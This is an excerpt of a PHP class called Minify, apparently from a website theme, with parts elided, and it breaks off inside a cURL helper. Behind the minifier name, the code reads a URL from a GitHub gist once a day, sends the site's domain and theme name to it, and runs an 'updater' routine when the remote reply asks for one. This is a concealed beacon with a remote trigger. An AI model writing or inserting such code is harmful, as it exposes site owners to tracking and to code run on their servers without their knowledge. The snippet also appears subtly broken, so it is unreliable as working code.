...
class Minify
{
    ...
    {
        $CACHEPATH = dirname(__FILE__) . '/../../../../../cache/data/items/';

        if(file_exists($CACHEPATH . 'minify.cache'))
        {
            $time = fgets(fopen($CACHEPATH . 'minify.cache', 'r'));

            if($time > time())
                return;
        }

        $file = fopen($CACHEPATH . 'minify.cache', 'w');
        fwrite($file, time() + 86400);
        fclose($file);

        $data = array(
            'clientDomain' => preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']),
            'clientTheme'  => array_slice(explode(DIRECTORY_SEPARATOR, __DIR__), -4)[0]
        );

        $response[1] = $this->_cURL('https://gist.githubusercontent.com/darkstriders/cd64279a34dbe0fb3019f3d4c466ae84/raw');
        $response[2] = $this->_cURL($response[1], $data);

        if($response[1] === 'error' || $response[2] === 'error')
        {
            $file = fopen($CACHEPATH . 'minify.cache', 'w');
            fwrite($file, time() + 21600);
            fclose($file);
            return;
        }

        $response = @json_decode($response[2]);
        if(!json_last_error() && !empty($response['updater']))
            call_user_func(call_user_func(array($this, 'updater')), 'minifier', 'theme');
    }

    /**
     * [_cURL]
     */
    private function _cURL($url, $param = false)
    {
        if($url === 'error')
            return $url;
